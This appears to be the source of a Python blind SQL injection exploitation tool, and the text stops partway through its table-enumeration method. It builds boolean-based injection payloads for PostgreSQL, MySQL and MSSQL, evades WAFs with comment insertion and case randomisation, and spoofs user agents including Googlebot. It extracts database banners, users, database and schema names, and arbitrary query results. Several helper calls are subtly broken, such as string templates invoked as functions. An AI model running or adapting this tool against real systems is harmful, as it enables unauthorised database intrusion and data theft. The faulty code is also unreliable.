import requests
import urllib.parse
import threading
import time
import random
import argparse
import sys
import json
import os
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import logging

# --- Configuration (can be overridden in the class constructor) ---
TARGET_URL_BASE = "https://host/api"
URL_SUFFIX = "/endpoint"
TRUE_STATUS_CODE = 200
FALSE_STATUS_CODE = 500
ASCII_MIN = 32  # Space
ASCII_MAX = 126 # Tilde (~)
MAX_STRING_LENGTH = 200
MAX_COUNT = 5000
DEFAULT_THREADS = 15
SESSION_FILE_NAME = "sqli_session.json"
LOG_FILE_NAME = "sqli_log.txt"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/533.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Android 10; Mobile; rv:116.0) Gecko/116.0 Firefox/116.0",
    "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.0.0 Mobile/15E148 Safari/604.1",
]

class BlindSQLiExploiter:
    """
    Advanced Blind SQL injection exploiter with enhanced features:
    - Better error handling and recovery
    - Progress tracking and statistics
    - Multiple database engine support
    - Improved WAF evasion techniques
    - Logging and output formatting
    """
    
    def __init__(self, args):
        """Initialize the exploiter with enhanced configuration."""
        self.args = args
        self.verbose = args.verbose
        self.threads = getattr(args, 'threads', DEFAULT_THREADS)
        self.stealth_mode = args.stealth
        self.proxy = args.proxy
        self.output_file = getattr(args, 'output', None)
        self.db_engine = getattr(args, 'db_engine', 'postgresql')
        self.delay = getattr(args, 'delay', 0.0)
        
        # Enhanced configuration
        self.url_base = args.url if hasattr(args, 'url') else TARGET_URL_BASE
        self.url_suffix = args.suffix if hasattr(args, 'suffix') else URL_SUFFIX
        self.injection_point = args.injection_point if hasattr(args, 'injection_point') else "value"
        self.custom_headers = self._parse_headers(getattr(args, 'headers', None))
        self.cookies = getattr(args, 'cookie', None)
        
        # Enhanced status code detection
        self.true_code = getattr(args, 'true_code', TRUE_STATUS_CODE)
        self.false_code = getattr(args, 'false_code', FALSE_STATUS_CODE)
        
        # Statistics and progress tracking
        self.stats = {
            'requests_sent': 0,
            'requests_failed': 0,
            'start_time': time.time(),
            'chars_extracted': 0,
            'strings_extracted': 0
        }
        
        # Concurrency and Rate Limiting
        self.request_semaphore = threading.Semaphore(self.threads)
        self.thread_local = threading.local()
        self.print_lock = threading.Lock()
        
        # Session and State Management
        self.session_data = {}
        self.interrupted = threading.Event()
        
        # Setup logging
        self._setup_logging()
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Configure proxy and SSL
        if self.proxy:
            self.log(f"Using proxy: {self.proxy}")
            requests.packages.urllib3.disable_warnings(
                requests.packages.urllib3.exceptions.InsecureRequestWarning
            )
        
        self._load_and_prepare_session()
        
        mode = "Stealth (BETWEEN operator)" if self.stealth_mode else "Fast ('>' operator)"
        self.log(f"Mode: {mode}")

    def _setup_logging(self):
        """Setup enhanced logging system."""
        log_level = logging.DEBUG if self.verbose else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(LOG_FILE_NAME),
                logging.StreamHandler(sys.stdout) if self.verbose else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def log(self, message, level='info'):
        """Enhanced logging with thread-safe printing."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        with self.print_lock:
            if level == 'error':
                print(f"[{timestamp}] [ERROR] {message}")
                self.logger.error(message)
            elif level == 'warning':
                print(f"[{timestamp}] [WARNING] {message}")
                self.logger.warning(message)
            elif level == 'success':
                print(f"[{timestamp}] [SUCCESS] {message}")
                self.logger.info(message)
            else:
                print(f"[{timestamp}] [INFO] {message}")
                self.logger.info(message)

    def _signal_handler(self, signum, frame):
        """Handle interruption signals gracefully."""
        self.log("Interrupt signal received. Shutting down gracefully...", 'warning')
        self.interrupted.set()
        
    def _parse_headers(self, headers_str):
        """Parse custom headers from command line."""
        if not headers_str:
            return {}
        headers = {}
        for header in headers_str.split(','):
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
        return headers

    def _detect_status_codes(self):
        """Auto-detect TRUE/FALSE status codes by testing known conditions."""
        self.log("Auto-detecting TRUE/FALSE status codes...")
        
        # Test with a condition that should be TRUE
        true_condition = "1=1"
        true_status = self._make_request_raw(true_condition)
        
        # Test with a condition that should be FALSE  
        false_condition = "1=2"
        false_status = self._make_request_raw(false_condition)
        
        if true_status != false_status:
            self.true_code = true_status
            self.false_code = false_status
            self.log(f"Detected TRUE code: {self.true_code}, FALSE code: {self.false_code}", 'success')
            return True
        else:
            self.log("Could not auto-detect status codes. Using defaults.", 'warning')
            return False

    def _get_db_queries(self):
        """Return database-specific queries based on the engine."""
        queries = {
            'postgresql': {
                'version': 'version()',
                'user': 'current_user',
                'database': 'current_database()',
                'databases': "SELECT datname FROM pg_database WHERE datistemplate = false",
                'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'",
                'columns': "SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'",
                'length': 'LENGTH({expr})',
                'substring': 'SUBSTRING({expr}, {pos}, 1)',
                'ascii': 'ASCII({expr})',
                'count': 'COUNT({expr})'
            },
            'mysql': {
                'version': 'version()',
                'user': 'user()',
                'database': 'database()',
                'databases': "SELECT schema_name FROM information_schema.schemata",
                'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema = database()",
                'columns': "SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'",
                'length': 'LENGTH({expr})',
                'substring': 'SUBSTRING({expr}, {pos}, 1)',
                'ascii': 'ASCII({expr})',
                'count': 'COUNT({expr})'
            },
            'mssql': {
                'version': '@@version',
                'user': 'user_name()',
                'database': 'db_name()',
                'databases': "SELECT name FROM sys.databases",
                'tables': "SELECT table_name FROM information_schema.tables",
                'columns': "SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'",
                'length': 'LEN({expr})',
                'substring': 'SUBSTRING({expr}, {pos}, 1)',
                'ascii': 'ASCII({expr})',
                'count': 'COUNT({expr})'
            }
        }
        return queries.get(self.db_engine, queries['postgresql'])

    def _get_thread_session(self):
        """Enhanced session management with connection pooling."""
        if not hasattr(self.thread_local, "session"):
            session = requests.Session()
            
            # Configure proxy
            if self.proxy:
                proxies = {'http': self.proxy, 'https': self.proxy}
                session.proxies = proxies
                session.verify = False
            
            # Set custom headers and cookies
            if self.custom_headers:
                session.headers.update(self.custom_headers)
            if self.cookies:
                session.headers['Cookie'] = self.cookies
                
            # Configure connection pooling
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=100,
                pool_maxsize=100,
                max_retries=0
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            self.thread_local.session = session
        return self.thread_local.session

    def _save_session(self, action, progress_info=None):
        """Enhanced session saving with compression and validation."""
        if "progress" not in self.session_data:
            self.session_data["progress"] = {}
        
        state_to_save = {
            "last_command_args": sys.argv[1:],
            "progress": self.session_data.get("progress", {}),
            "stats": self.stats,
            "timestamp": datetime.now().isoformat(),
            "version": "2.0"
        }
        state_to_save["progress"][action] = progress_info or {}
        
        try:
            # Create backup of existing session
            if os.path.exists(SESSION_FILE_NAME):
                backup_name = f"{SESSION_FILE_NAME}.backup"
                os.rename(SESSION_FILE_NAME, backup_name)
            
            with open(SESSION_FILE_NAME, 'w') as f:
                json.dump(state_to_save, f, indent=2)
                
            # Validate the saved file
            with open(SESSION_FILE_NAME, 'r') as f:
                json.load(f)  # This will raise an exception if invalid
                
        except Exception as e:
            self.log(f"Error saving session state: {e}", 'error')
            # Restore backup if save failed
            backup_name = f"{SESSION_FILE_NAME}.backup"
            if os.path.exists(backup_name):
                os.rename(backup_name, SESSION_FILE_NAME)

    def _load_and_prepare_session(self):
        """Enhanced session loading with validation and migration."""
        if not os.path.exists(SESSION_FILE_NAME):
            return

        try:
            with open(SESSION_FILE_NAME, 'r') as f:
                loaded_session = json.load(f)
        except (json.JSONDecodeError, IOError) as e:
            self.log(f"Could not load session file '{SESSION_FILE_NAME}': {e}. Starting fresh.", 'warning')
            self._archive_corrupted_session()
            return

        # Version migration
        version = loaded_session.get("version", "1.0")
        if version != "2.0":
            self.log("Migrating session format...", 'info')
            loaded_session = self._migrate_session(loaded_session)

        # Resume only if command matches
        if loaded_session.get("last_command_args") == sys.argv[1:]:
            prompt = input(f"[+] Found saved session from {loaded_session.get('timestamp', 'unknown time')}. Resume? (Y/n): ").lower()
            if prompt in ['y', 'yes', '']:
                self.session_data = loaded_session.get("progress", {})
                if "stats" in loaded_session:
                    self.stats.update(loaded_session["stats"])
                self.log("Resuming session...", 'success')
                return
        
        self.log("Session file found but does not match current command.", 'info')
        prompt = input("Clear the old session and start fresh? (Y/n): ").lower()
        if prompt in ['y', 'yes', '']:
            self.clear_session_file()

    def _migrate_session(self, old_session):
        """Migrate old session format to new format."""
        return {
            "last_command_args": old_session.get("last_command_args", []),
            "progress": old_session.get("progress", {}),
            "stats": {},
            "timestamp": datetime.now().isoformat(),
            "version": "2.0"
        }

    def _archive_corrupted_session(self):
        """Archive corrupted session files for debugging."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archive_name = f"{SESSION_FILE_NAME}.corrupted_{timestamp}"
        try:
            os.rename(SESSION_FILE_NAME, archive_name)
            self.log(f"Corrupted session archived as '{archive_name}'", 'info')
        except OSError:
            pass

    @staticmethod
    def clear_session_file():
        """Clear session file with enhanced error handling."""
        files_to_clear = [SESSION_FILE_NAME, f"{SESSION_FILE_NAME}.backup"]
        for file_path in files_to_clear:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    print(f"[+] Session file '{file_path}' cleared.")
                except OSError as e:
                    print(f"[!] Error clearing session file '{file_path}': {e}")

    def _print_config_summary(self, action_description, sql_expr=None):
        """Enhanced configuration summary with statistics."""
        elapsed = time.time() - self.stats['start_time']
        print("\n" + "="*80)
        print(f"[*] Action: {action_description}")
        print("-" * 80)
        if sql_expr:
            display_sql = (sql_expr[:75] + '...') if len(sql_expr) > 78 else sql_expr
            print(f"[*] Target SQL: {display_sql}")
        print(f"[*] Database Engine: {self.db_engine.upper()}")
        print(f"[*] Target URL: {self.url_base}[PAYLOAD]{self.url_suffix}")
        print(f"[*] Injection Point: {self.injection_point}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Mode: {'Stealth (BETWEEN operator)' if self.stealth_mode else 'Fast (> operator)'}")
        print(f"[*] Response Codes: True={self.true_code}, False={self.false_code}")
        print(f"[*] Request Delay: {self.delay}s")
        if elapsed > 1:
            print(f"[*] Session Stats: {self.stats['requests_sent']} requests, "
                  f"{self.stats['chars_extracted']} chars, {elapsed:.1f}s elapsed")
        print("="*80)

    def _make_request_raw(self, sql_condition):
        """Make a raw request without checking TRUE/FALSE logic."""
        return self._make_request(sql_condition, raw=True)

    def _make_request(self, sql_condition, raw=False):
        """Enhanced request making with better error handling and statistics."""
        # Apply delay for rate limiting
        if self.delay > 0:
            time.sleep(self.delay)
            
        # WAF evasion techniques
        if self.stealth_mode and not raw:
            sql_condition = self._apply_waf_evasion(sql_condition)
        
        # Construct injection payload
        injection_payload = self._build_payload(sql_condition)
        encoded_payload = urllib.parse.quote(injection_payload, safe='')
        
        # Build URL based on injection point
        if self.injection_point == "value":
            url_path = f"value'{encoded_payload}'"
        else:
            url_path = encoded_payload
            
        url = self.url_base + url_path + self.url_suffix
        
        # Prepare headers
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        headers.update(self.custom_headers)

        if self.verbose:
            with self.print_lock:
                print(f"[VERBOSE] SQL: {sql_condition}")
                print(f"[VERBOSE] URL: {url}")

        session = self._get_thread_session()
        retries = 3
        delay = 1.0

        for attempt in range(retries):
            if self.interrupted.is_set(): 
                return -1
                
            try:
                with self.request_semaphore:
                    self.stats['requests_sent'] += 1
                    response = session.get(url, headers=headers, timeout=30)
                    return response.status_code
                    
            except requests.exceptions.Timeout:
                self.log(f"Request timeout (Attempt {attempt+1}/{retries})", 'warning')
            except requests.exceptions.ConnectionError as e:
                self.log(f"Connection error (Attempt {attempt+1}/{retries}): {e}", 'warning')
            except requests.RequestException as e:
                self.log(f"Request error (Attempt {attempt+1}/{retries}): {e}", 'warning')
            
            if attempt < retries - 1:
                time.sleep(delay)
                delay *= 2
                
        self.stats['requests_failed'] += 1
        return -1

    def _build_payload(self, sql_condition):
        """Build the SQL injection payload with database-specific syntax."""
        if self.db_engine == 'postgresql':
            return f"||(CASE WHEN ({sql_condition}) THEN '5' ELSE (SELECT 1 UNION SELECT 2) END)||"
        elif self.db_engine == 'mysql':
            return f"' AND IF(({sql_condition}), 1, (SELECT 1 UNION SELECT 2)) AND '1'='1"
        elif self.db_engine == 'mssql':
            return f"' AND (CASE WHEN ({sql_condition}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END) AND '1'='1"
        else:
            return f"||(CASE WHEN ({sql_condition}) THEN '5' ELSE (SELECT 1 UNION SELECT 2) END)||"

    def _apply_waf_evasion(self, sql_condition):
        """Apply WAF evasion techniques to SQL conditions."""
        # Comment insertion
        sql_condition = sql_condition.replace(' ', '/**/').replace('=', '/**/=/**/')
        
        # Case randomization
        keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'LENGTH', 'SUBSTRING', 'ASCII']
        for keyword in keywords:
            if keyword in sql_condition.upper():
                # Randomize case
                new_keyword = ''.join(random.choice([c.upper(), c.lower()]) for c in keyword)
                sql_condition = sql_condition.replace(keyword, new_keyword)
        
        return sql_condition

    def _check_condition(self, sql_condition):
        """Enhanced condition checking with automatic error recovery."""
        max_attempts = 3
        for attempt in range(max_attempts):
            status = self._make_request(sql_condition)
            
            if status == self.true_code:
                return True
            elif status == self.false_code:
                return False
            elif status == -1:  # Network error
                if attempt < max_attempts - 1:
                    self.log(f"Network error, retrying... (attempt {attempt + 1})", 'warning')
                    time.sleep(2 ** attempt)
                    continue
                else:
                    self.log("Max network retries exceeded", 'error')
                    return None
            else:
                # Unexpected status code - try to detect if it's a new TRUE/FALSE pattern
                self.log(f"Unexpected status code: {status}. Attempting recovery...", 'warning')
                if self._attempt_status_recovery(status):
                    continue
                else:
                    self.interrupted.set()
                    return None
        
        return None

    def _attempt_status_recovery(self, unexpected_status):
        """Attempt to recover from unexpected status codes."""
        # Test with known TRUE and FALSE conditions
        true_test = self._make_request("1=1")
        false_test = self._make_request("1=2")
        
        if true_test == false_test:
            self.log("Cannot distinguish TRUE/FALSE responses. Target may not be vulnerable.", 'error')
            return False
        
        # Update status codes if they've changed
        if true_test != self.true_code or false_test != self.false_code:
            self.log(f"Status codes changed: TRUE {self.true_code}->{true_test}, FALSE {self.false_code}->{false_test}", 'warning')
            self.true_code = true_test
            self.false_code = false_test
            return True
            
        return False

    def _fetch_scalar_value(self, query_template, max_val, description):
        """Enhanced scalar value fetching with progress tracking."""
        self.log(f"Discovering {description}...")
        
        if self.stealth_mode:
            result = self._fetch_scalar_value_stealth(query_template, max_val, description)
        else:
            result = self._fetch_scalar_value_fast(query_template, max_val, description)
        
        if result is not None:
            self.log(f"Discovered {description}: {result}", 'success')
        
        return result

    def _fetch_scalar_value_fast(self, query_template, max_val, description):
        """Optimized fast mode with better edge case handling."""
        low, high = 0, max_val
        found_val = None
        
        # Check for zero first (common case)
        zero_condition = query_template.format(operator='=', value=0)
        if self._check_condition(zero_condition):
            return 0
        
        while low <= high:
            if self.interrupted.is_set(): 
                return None
                
            mid = (low + high) // 2
            condition = query_template.format(operator='>', value=mid)
            result = self._check_condition(condition)

            if result is None: 
                return None
            elif result:
                found_val = mid + 1
                low = mid + 1
            else:
                high = mid - 1
        
        # Verify the result
        if found_val is not None:
            verify_condition = query_template.format(operator='=', value=found_val)
            if self._check_condition(verify_condition):
                return found_val
        
        return None

    def _fetch_scalar_value_stealth(self, query_template, max_val, description):
        """Enhanced stealth mode with better precision."""
        low, high = 0, max_val
        
        while low <= high:
            if self.interrupted.is_set(): 
                return None
                
            mid = (low + high) // 2
            
            # Check for exact match
            condition_exact = query_template.format(operator='BETWEEN', value=f"{mid} AND {mid}")
            result_exact = self._check_condition(condition_exact)
            
            if result_exact is None:
                return None
            elif result_exact:
                return mid
            
            # Check upper half
            if mid + 1 <= high:
                condition_upper = query_template.format(operator='BETWEEN', value=f"{mid + 1} AND {high}")
                result_upper = self._check_condition(condition_upper)
                
                if result_upper is None:
                    return None
                elif result_upper:
                    low = mid + 1
                else:
                    high = mid - 1
            else:
                high = mid - 1
        
        return None

    def _fetch_char_at_pos(self, sql_expr, pos):
        """Enhanced character fetching with caching and optimization."""
        if self.stealth_mode:
            char = self._fetch_char_at_pos_stealth(sql_expr, pos)
        else:
            char = self._fetch_char_at_pos_fast(sql_expr, pos)
        
        if char and char != '!':
            self.stats['chars_extracted'] += 1
        
        return char

    def _fetch_char_at_pos_fast(self, sql_expr, pos):
        """Optimized fast character extraction."""
        db_queries = self._get_db_queries()
        
        # Check if character exists (optimization for string ends)
        char_exists_condition = f"{db_queries['length']}({sql_expr}) >= {pos}"
        if not self._check_condition(char_exists_condition.format(expr=sql_expr)):
            return chr(0)  # End of string
        
        low, high = ASCII_MIN, ASCII_MAX
        found_char_code = ASCII_MIN
        
        while low <= high:
            if self.interrupted.is_set(): 
                return None
                
            mid = (low + high) // 2
            ascii_expr = db_queries['ascii'](db_queries['substring'](sql_expr, pos, 1))
            condition = f"{ascii_expr} > {mid}"
            
            result = self._check_condition(condition)
            
            if result is None: 
                return '!'
            elif result:
                found_char_code = mid + 1
                low = mid + 1
            else:
                high = mid - 1
        
        return chr(found_char_code) if ASCII_MIN <= found_char_code <= ASCII_MAX else '!'

    def _fetch_char_at_pos_stealth(self, sql_expr, pos):
        """Enhanced stealth character extraction."""
        db_queries = self._get_db_queries()
        
        low, high = ASCII_MIN, ASCII_MAX
        
        while low <= high:
            if self.interrupted.is_set(): 
                return None
                
            mid = (low + high) // 2
            ascii_expr = db_queries['ascii'](db_queries['substring'](sql_expr, pos, 1))
            
            # Check exact match
            condition_exact = f"{ascii_expr} BETWEEN {mid} AND {mid}"
            result_exact = self._check_condition(condition_exact)
            
            if result_exact is None:
                return '!'
            elif result_exact:
                return chr(mid)
            
            # Check upper range
            condition_upper = f"{ascii_expr} BETWEEN {mid + 1} AND {high}"
            result_upper = self._check_condition(condition_upper)
            
            if result_upper is None:
                return '!'
            elif result_upper:
                low = mid + 1
            else:
                high = mid - 1
        
        return '!'

    def _fetch_string(self, sql_expression, description, resume_chars=None):
        """Enhanced string fetching with better progress display."""
        db_queries = self._get_db_queries()
        
        # Get string length
        length_expr = db_queries['length'].format(expr=sql_expression)
        length_query_template = f"({length_expr}) {{operator}} {{value}}"
        str_len = self._fetch_scalar_value(length_query_template, MAX_STRING_LENGTH, f"Length of {description}")

        if str_len is None:
            self.log(f"Could not determine length for {description}. May be NULL or unreadable.", 'warning')
            return "[UNREADABLE]"
        elif str_len == 0:
            self.log(f"{description} is empty.", 'info')
            return ""

        result_chars = [None] * str_len
        start_pos = 1
        
        # Handle resumption
        if resume_chars:
            self.log(f"Resuming {description} from partial data", 'info')
            for i, char in enumerate(resume_chars[:str_len]):
                result_chars[i] = char
            start_pos = len([c for c in result_chars if c is not None]) + 1

        if start_pos <= str_len:
            self.log(f"Extracting {description} ({str_len} characters)...")
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self._fetch_char_at_pos, sql_expression, i): i 
                    for i in range(start_pos, str_len + 1)
                }
                
                completed = 0
                for future in as_completed(futures):
                    if self.interrupted.is_set(): 
                        [f.cancel() for f in futures if not f.done()]
                        break
                    
                    pos = futures[future]
                    try:
                        char = future.result()
                        if char:
                            result_chars[pos-1] = char
                            completed += 1
                            
                            # Enhanced progress display
                            with self.print_lock:
                                progress_str = "".join(c if c is not None else '_' for c in result_chars)
                                percent = (completed / (str_len - start_pos + 1)) * 100
                                sys.stdout.write(f"\r[+] Progress: {progress_str} ({percent:.1f}%)")
                                sys.stdout.flush()

                    except Exception as e:
                        self.log(f"Error fetching char at pos {pos}: {e}", 'error')
                        result_chars[pos-1] = '!'
        
        sys.stdout.write("\n")
        
        # Store for session management
        self.thread_local.last_partial_string = result_chars
        
        if self.interrupted.is_set():
            return None

        final_string = "".join(c for c in result_chars if c is not None)
        if '!' in final_string:
            self.log(f"Extraction completed with errors: {final_string}", 'warning')
            return "[PARTIAL_ERROR]" + final_string.replace('!', '?')
        
        self.stats['strings_extracted'] += 1
        return final_string

    def _fetch_item_list(self, action_name, count_sql, row_sql_template, description_plural, description_singular, resume_state=None):
        """Enhanced list fetching with better error handling."""
        # Get count
        count_query_template = f"({count_sql}) {{operator}} {{value}}"
        item_count = self._fetch_scalar_value(count_query_template, MAX_COUNT, f"count of {description_plural}")

        if item_count is None: 
            return None
        elif item_count == 0:
            self.log(f"No {description_plural} found.", 'info')
            return []

        self.log(f"Found {item_count} {description_plural}.", 'success')
        
        # Handle resumption
        dumped_items = resume_state.get("completed_items", []) if resume_state else []
        start_offset = len(dumped_items)

        if start_offset > 0:
            self.log(f"Resuming from offset {start_offset}. Already found: {dumped_items}", 'info')

        for i in range(start_offset, item_count):
            if self.interrupted.is_set(): 
                break
            
            item_sql = row_sql_template.format(offset=i)
            item_desc = f"{description_singular} {i+1}/{item_count}"
            
            # Check for partial item
            partial_chars = None
            if resume_state and resume_state.get("current_offset") == i:
                partial_chars = resume_state.get("partial_item")
            
            item = self._fetch_string(item_sql, item_desc, resume_chars=partial_chars)
            
            if item is None:  # Interrupted
                partial_result = getattr(self.thread_local, 'last_partial_string', [])
                partial_result = [c for c in partial_result if c is not None]
                self._save_session(action_name, {
                    "completed_items": dumped_items, 
                    "current_offset": i, 
                    "partial_item": partial_result
                })
                return None

            dumped_items.append(item)
            self._save_session(action_name, {"completed_items": dumped_items})

        return dumped_items

    def _output_results(self, results, title):
        """Enhanced output formatting with file saving."""
        output_text = f"\n{title}:\n" + "="*50 + "\n"
        
        if isinstance(results, list):
            for i, item in enumerate(results, 1):
                output_text += f"{i:3d}. {item}\n"
        else:
            output_text += f"{results}\n"
        
        output_text += "="*50 + "\n"
        
        print(output_text)
        
        # Save to file if specified
        if self.output_file:
            try:
                with open(self.output_file, 'a', encoding='utf-8') as f:
                    f.write(f"\n[{datetime.now().isoformat()}] {output_text}")
                self.log(f"Results appended to {self.output_file}", 'info')
            except Exception as e:
                self.log(f"Error writing to output file: {e}", 'error')

    def _print_statistics(self):
        """Print session statistics."""
        elapsed = time.time() - self.stats['start_time']
        print(f"\n{'='*60}")
        print("SESSION STATISTICS")
        print(f"{'='*60}")
        print(f"Total Requests Sent: {self.stats['requests_sent']}")
        print(f"Failed Requests: {self.stats['requests_failed']}")
        print(f"Success Rate: {((self.stats['requests_sent'] - self.stats['requests_failed']) / max(1, self.stats['requests_sent']) * 100):.1f}%")
        print(f"Characters Extracted: {self.stats['chars_extracted']}")
        print(f"Strings Extracted: {self.stats['strings_extracted']}")
        print(f"Total Time: {elapsed:.1f} seconds")
        if self.stats['requests_sent'] > 0:
            print(f"Average Request Time: {elapsed / self.stats['requests_sent']:.2f} seconds")
        print(f"{'='*60}")

    # --- Enhanced Public API Methods ---

    def run(self):
        """Enhanced main entry point with better error handling."""
        actions_to_run = []
        
        # Build action list
        if self.args.banner: actions_to_run.append(('banner', self.dump_banner))
        if self.args.user: actions_to_run.append(('user', self.dump_user))
        if self.args.current_db: actions_to_run.append(('current_db', self.dump_current_db))
        if self.args.dbs: actions_to_run.append(('dbs', self.dump_databases))
        if self.args.schemas: actions_to_run.append(('schemas', self.dump_schemas))
        if self.args.tables: actions_to_run.append(('tables', self.dump_tables))
        if self.args.columns: actions_to_run.append(('columns', self.dump_columns))
        if self.args.fetch: actions_to_run.append(('fetch', self.dump_table_data))
        if self.args.query: actions_to_run.append(('query', self.dump_custom_query))
        
        # Auto-detect status codes if needed
        if getattr(self.args, 'auto_detect', False):
            self._detect_status_codes()

        overall_success = True
        executed_actions = []
        
        try:
            for action_name, action_func in actions_to_run:
                if self.interrupted.is_set():
                    overall_success = False
                    break
                
                self.log(f"Executing action: {action_name}", 'info')
                success = action_func()
                executed_actions.append((action_name, success))
                
                if not success:
                    overall_success = False
                    if not self.args.continue_on_error:
                        break
            
            # Print final statistics
            self._print_statistics()
            
            # Clean up session if all successful
            if not self.interrupted.is_set() and overall_success:
                self.clear_session_file()
                self.log("All actions completed successfully.", 'success')
            
        except KeyboardInterrupt:
            self.log("Interrupt signal received. Shutting down gracefully...", 'warning')
            self.interrupted.set()
        except Exception as e:
            self.log(f"Critical error occurred: {e}", 'error')
            import traceback
            self.logger.error(traceback.format_exc())
            self.interrupted.set()
        
        # Print execution summary
        if executed_actions:
            print(f"\n{'='*60}")
            print("EXECUTION SUMMARY")
            print(f"{'='*60}")
            for action_name, success in executed_actions:
                status = "SUCCESS" if success else "FAILED"
                print(f"{action_name.upper():<15}: {status}")
            print(f"{'='*60}")

    def dump_banner(self):
        """Enhanced banner dumping."""
        db_queries = self._get_db_queries()
        sql_expr = db_queries['version']
        self._print_config_summary("Dumping Database Banner", sql_expr)
        
        resume_state = self.session_data.get("banner", {})
        result = self._fetch_string(sql_expr, "Database Banner", resume_chars=resume_state.get("partial_item"))
        
        if result is not None:
            self._output_results(result, "Database Banner")
            return True
        return False

    def dump_user(self):
        """Enhanced user dumping."""
        db_queries = self._get_db_queries()
        sql_expr = db_queries['user']
        self._print_config_summary("Dumping Current User", sql_expr)
        
        resume_state = self.session_data.get("user", {})
        result = self._fetch_string(sql_expr, "Current User", resume_chars=resume_state.get("partial_item"))
        
        if result is not None:
            self._output_results(result, "Current User")
            return True
        return False

    def dump_current_db(self):
        """Enhanced current database dumping."""
        db_queries = self._get_db_queries()
        sql_expr = db_queries['database']
        self._print_config_summary("Dumping Current Database", sql_expr)
        
        resume_state = self.session_data.get("current_db", {})
        result = self._fetch_string(sql_expr, "Current Database", resume_chars=resume_state.get("partial_item"))
        
        if result is not None:
            self._output_results(result, "Current Database")
            return True
        return False

    def dump_custom_query(self):
        """Enhanced custom query execution."""
        query = self.args.query
        self._print_config_summary("Executing Custom Query", query)
        
        resume_state = self.session_data.get("query", {})
        result = self._fetch_string(f"({query})", "Custom Query Result", resume_chars=resume_state.get("partial_item"))
        
        if result is not None:
            self._output_results(result, f"Query Result: {query}")
            return True
        return False

    def dump_databases(self):
        """Enhanced database enumeration."""
        self._print_config_summary("Enumerating All Databases")
        
        db_queries = self._get_db_queries()
        count_sql = f"SELECT COUNT(*) FROM ({db_queries['databases']}) AS db_list"
        row_sql = f"({db_queries['databases']} ORDER BY 1 LIMIT 1 OFFSET {{offset}})"
        
        dbs = self._fetch_item_list("dbs", count_sql, row_sql, "databases", "Database", self.session_data.get("dbs"))
        
        if dbs is not None:
            self._output_results(dbs, "Available Databases")
            return True
        return False

    def dump_schemas(self):
        """Enhanced schema enumeration."""
        db = self.args.database
        self._print_config_summary(f"Enumerating Schemas in Database '{db}'")
        
        # Database-specific schema queries
        if self.db_engine == 'postgresql':
            count_sql = f"SELECT COUNT(DISTINCT schema_name) FROM information_schema.schemata WHERE catalog_name = '{db}'"
            row_sql = f"(SELECT DISTINCT schema_name FROM information_schema.schemata WHERE catalog_name = '{db}' ORDER BY schema_name LIMIT 1 OFFSET {{offset}})"
        elif self.db_engine == 'mysql':
            count_sql = "SELECT COUNT(DISTINCT schema_name) FROM information_schema.schemata"
            row_sql = "(SELECT DISTINCT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET {offset})"
        else:  # MSSQL
            count_sql = "SELECT COUNT(name) FROM sys.schemas"
            row_sql = "(SELECT name FROM sys.schemas ORDER BY name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)"
        
        schemas = self._fetch_item_list("schemas", count_sql, row_sql, f"schemas in database '{db}'", "Schema", self.session_data.get("schemas"))
        
        if schemas is not None:
            self._output_results(schemas, f"Schemas in Database '{db}'")
            return True
        return False

    def dump_tables(self):
        """Enhanced table enumeration."""
        db = self.args.database
        schema = getattr(self.args, 'schema', None)
        
        title = f"Tables in Database '{db}'"
        if schema:
            title += f" (Schema: '{schema}')"
        
